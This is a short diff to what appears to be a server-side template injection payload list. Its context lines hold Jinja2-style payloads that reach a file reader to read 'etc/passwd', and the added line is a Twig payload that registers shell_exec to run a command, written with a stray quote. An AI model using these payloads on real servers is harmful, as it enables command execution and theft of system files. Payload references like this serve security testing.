@@ -18,4 +18,5 @@
 {{[].__class__.__base__.__subclasses__()[40] }} 
 {{[].__class__.__base__.__subclasses__().pop(40) }}
 {{[].__class__.__base__.__subclasses__().pop(40)('etc/passwd').read() }}
+{{_self.env.registerUndefinedFilterCallback('shell_exec')}}{{_self.env.getFilter('dir)}}
 ```
